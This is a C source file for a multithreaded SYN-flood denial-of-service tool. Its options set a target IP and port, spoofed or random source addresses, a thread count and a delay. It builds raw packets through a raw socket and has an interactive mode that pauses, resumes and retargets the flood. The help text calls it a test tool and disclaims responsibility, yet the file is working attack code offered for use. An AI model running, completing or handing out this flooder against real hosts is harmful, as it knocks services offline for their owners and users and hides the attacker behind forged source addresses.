#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netdb.h>
#include<string.h>
#include"syn.h"


extern char *optarg;

char *help="\
Usage: syn [OPTION] -a [destination_ip:destination_port]\n\
  -h                                    Show the help infomation.\n\
  -d                                    Open the debug model.\n\
  -a [destination_ip:destination_port]  The target you need to attack.\n\
  -i [source_ip]                        Set the source ip.\n\
                                          Default random IP.\n\
  -p [source_port]                      Set the source port.\n\
                                          Default random port.\n\
  -t [millisecond]                      Delay after each attack.\n\
                                          Default 0.\n\
  -f                                    Open fast model, it need\n\
                                          -i and -p argument.\n\
  -l [thread_number]                    Set the thread number.\n\
                                          The max thread number is %d\n\
\n\
If you have some problems, welcome to website < www.eonew.cn > to contact author.\n\
The software is only used for test, please do not use illegally.\n\
Otherwise, you will accept responsibility for the negative results or effects of your choice or action,\n\
and author is not responsible.\n\
";
char *debug_help="\
  h                                    Show the help infomation.\n\
  q                                    Quit this software.\n\
  w                                    Pause all thread.\n\
  r                                    Restart all thread.\n\
  s                                    Show all infomations.\n\
  a [destination_ip:destination_port]  The target you need to attack.\n\
  i [source_ip]                        Set the source ip.\n\
                                          Default random IP.\n\
  p [source_port]                      Set the source port.\n\
                                          Default random port.\n\
  t [millisecond]                      Delay after each attack.\n\
                                          Default 0.\n\
\n\
If you have some problems, welcome to website < www.eonew.cn > to contact author.\n\
The software is only used for test, please do not use illegally.\n\
Otherwise, you will accept responsibility for the negative results or effects of your choice or action,\n\
and author is not responsible.\n\
";


int main(int argc, char *argv[])
{
    if(argc==1)
    {
        printf(help,MAXCHILD);
        return 0;
    }
    int arg_d=0,arg_i=0,arg_p=0,arg_t=0,arg_f=0,arg_a=0,arg_l=0;

	int thread=1;

    char dst_ip[0x20] = { 0 };
    int dst_port;

    thread_arg arg={0};
    int opt;
    while((opt=getopt(argc,argv,"ha:di:p:t:fl:"))!=-1)
    {
        char buf[0x20]={0};
        switch(opt)
        {
            case 'h':
                printf(help,MAXCHILD);
                return 0;
            case 'a':
                arg_a=1;
                strncpy(buf,optarg,0x20);
                char *t=strchr(buf,':');
                *t=0;

                strncpy(dst_ip,buf,0x20);
                dst_port=atoi(t+1);
                
                break; 
            case 'd':
                arg_d=1;
                break;
            case 'i':
                arg_i=1;
                strncpy(arg.source_ip,optarg,0x20);
                break; 
            case 'p':
                arg_p=1;
                strncpy(buf,optarg,0x20);
                arg.source_port=atoi(buf);
                break; 
            case 't':
                arg_t=1;
                strncpy(buf,optarg,0x20);
                arg.time=atoi(buf);
                
                break; 
            case 'f':                
                arg_f=1;                
                break;
            case 'l':
                arg_l=1;
                strncpy(buf,optarg,0x20);
                thread=atoi(buf);
                break; 
        }
    }

    
    arg.model=MODEL_NORMAL;
    if(arg_a==0)
    {
        fprintf(stderr,"Error: Don't have -a argument! Enter -h for help\n");
        exit(1);
    }
    else if(arg_d==1&&arg_f==1)
    {
        fprintf(stderr,"Error: Parameters -d and -f cannot be used together! Enter -h for help\n");
        exit(1);
    }
    else if(arg_f==1 && !(arg_i==1 && arg_p==1))
    {
        fprintf(stderr,"Error: Using fast model need to set source ip and source port! Enter -h for help\n");
        exit(1);
    }
    else if(arg_t==1 && arg_d==0)
    {
        fprintf(stderr,"Error: Using delay model need to add -d argument! Enter -h for help\n");
        exit(1);
    }
    // else if(arg_l==1&&arg_d==1)
    // {
    //     fprintf(stderr,"Error: Parameters -d and -l cannot be used together! Enter -h for help\n");
    //     exit(1);
    // }
    else if(arg_f==1)
    {
        arg.model=MODEL_FAST;
    }
    else if(arg_d==1)
    {
        arg.model=MODEL_DEBUG;
    }
    else if(arg_i==1&&arg_p==0)
    {
        arg.model=MODEL_SET_IP;
    }
    else if(arg_i==0&&arg_p==1)
    {
        arg.model=MODEL_SET_PORT;
    }
    else
    {
        arg.model=MODEL_NORMAL;
    }
    

    

    /* Raw socket */
    int sockfd;

	struct sockaddr_in addr;
	struct hostent * host = NULL;

	int on = 1;
	pthread_t pthread[MAXCHILD];
	int err = -1;

    //initail mutex lock
    pthread_mutex_t mutex={0};
    arg.mutex=&mutex;


	/* Intercept the signal CTRL+C */
	signal(SIGINT, sig_int);


	memset(&addr, 0, sizeof(addr));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(dst_port);

	if (inet_addr(dst_ip) == INADDR_NONE)
	{
		/* For DNS address, query and convert to IP address */
		host = gethostbyname(argv[1]);
		if (host == NULL)
		{
			perror("gethostbyname()");
			exit(1);
		}
		addr.sin_addr = *((struct in_addr*)&(host->h_addr_list));
		strncpy(dst_ip, inet_ntoa(addr.sin_addr), 16);
	}
	else
	{
		addr.sin_addr.s_addr = inet_addr(dst_ip);
	}

	if (dst_port < 0 || dst_port > 65535)
	{
		printf("Port Error\n");
		exit(1);
	}

	printf("host ip=%s\n", inet_ntoa(addr.sin_addr));

	/* Establish raw socket */
	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (sockfd < 0)
	{
		perror("socket()");
		exit(1);
	}
	/* Set IP options */
	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0)
	{
		perror("setsockopt()");
		exit(1);
	}

	/* Change the program's permissions to regular users */
	//setuid(getpid());

    
    arg.addr=&addr;
    arg.dst_ip=dst_ip;
    arg.dst_port=dst_port;
    arg.sockfd=sockfd;
	
	puts("Start testing");
	/* Create multiple threads to work together */
	for(int i=0; i<thread; i++)
	{
		err = pthread_create(&pthread[i], NULL, send_synflood, (void *)&arg);

		if(err != 0)
		{
			fprintf(stderr,"pthread_create()\n");
			exit(1);
		}
	}

    //debug model
    if(arg_d==1)
    {
        usleep(1000);
        int lock=0;
        char buf[0x100];
        while(buf[0]!='q')
        {
            memset(buf,0,0x100);
            printf("syn >>> ");
            fflush(stdout);
            fflush(stdin);
            fgets(buf,0x100,stdin);
            

            
            switch (buf[0])
            {
                case 'q':
                    puts("Goodbye!");
                    break;

                case 'h':
                    printf(debug_help,MAXCHILD);
                    break;

                case 't':
                    if(buf[1]!=' ')
                    {
                        fprintf(stderr,"Error: enter h for help\n");
                        break;
                    }
                    arg.time=atoi(buf+2);
                    printf("Set %d ms delay.\n",arg.time);
                    break;

                case 'i':
                    if(buf[1]!=' ')
                    {
                        fprintf(stderr,"Error: enter h for help\n");
                        break;
                    }
                    strncpy(arg.source_ip,buf+2,0x20);
                    printf("Set the source IP to %s.\n",buf+2);
                    break;

                case 'p':
                    if(buf[1]!=' ')
                    {
                        fprintf(stderr,"Error: enter h for help\n");
                        break;
                    }
                    arg.source_port=atoi(buf+2);
                    printf("Set the source port to %d.\n",arg.source_port);
                    break;

                case 'w':
                    if(lock==0)
                    {
                        pthread_mutex_lock(arg.mutex);
                        puts("Pause all threads.");
                        lock=1;
                    }
                    else
                    {
                        fprintf(stderr,"Error: All threads had been stopped!\n");
                    }
                    
                    break;

                case 'r':
                    if(lock==1)
                    {
                        pthread_mutex_unlock(arg.mutex);
                        puts("Restart all threads.");
                        lock=0;
                    }
                    else
                    {
                        fprintf(stderr,"Error: All threads had been started!\n");
                    }
                    break;
                case 'a':
                    if(buf[1]!=' ')
                    {
                        fprintf(stderr,"Error: enter h for help\n");
                        break;
                    }
                    char *t=strchr(buf,'\n');
                    *t=0;
                    t=strchr(buf,':');
                    *t=0;

                    strncpy(dst_ip,buf+2,0x20);
                    arg.dst_port=atoi(t+1);
                    *t=':';
                    printf("Set new attack target :%s\n",buf+2);
                    break;
                case 's':
                    printf("Target:         %s:%d\n",arg.dst_ip,arg.dst_port);
                    printf("Delay:          %d ms\n",arg.time);

                    if(arg.source_ip[0]!=0)
                    printf("Source IP:      %s\n",arg.source_ip);
                    else
                    printf("Source IP:      Random IP\n");

                    if(arg.source_port!=0)
                    printf("Source port:    %d\n",arg.source_port);

                    printf("Thread number:  %d\n",thread);

                    if(lock==0)
                    printf("All threads is runing.\n");
                    else if(lock==1)
                    printf("All threads is paused.\n");

                    break;
                default:
                    puts("Error: enter h for help");
                    break;
            }
        }

        return 0;
        
    }
    else
    {
        puts("Press Control+C to stop this program.");
    }

	/* Wait for all threads to end.  */
	for(int i=0; i<thread; i++)
	{
		err = pthread_join(pthread[i], NULL);

		if(err != 0)
		{
			fprintf(stderr,"pthread_join Error\n");
			exit(1);
		}
	}

	close(sockfd);

	return 0;
}

